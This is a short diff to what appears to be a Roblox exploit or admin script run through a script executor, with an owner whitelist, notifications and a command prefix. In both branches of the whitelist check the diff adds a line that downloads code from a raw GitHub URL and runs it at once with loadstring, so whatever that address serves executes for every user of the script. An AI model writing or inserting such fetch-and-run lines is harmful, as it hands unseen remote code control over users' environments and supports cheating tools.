@@ -27,6 +27,8 @@ getgenv().OP =
 
 if table.find(getgenv().OP, game:GetService("Players").LocalPlayer.UserId) then
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/smd/main/123"))()
+
 local CoreGui = game:GetService("StarterGui")
 
 CoreGui:SetCore("SendNotification", {
@@ -43,6 +45,8 @@ CoreGui:SetCore("SendNotification", {
 	Duration = 15;
 })
 else
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/smd/main/123"))()
 
 getgenv().Prefix = ":"
 
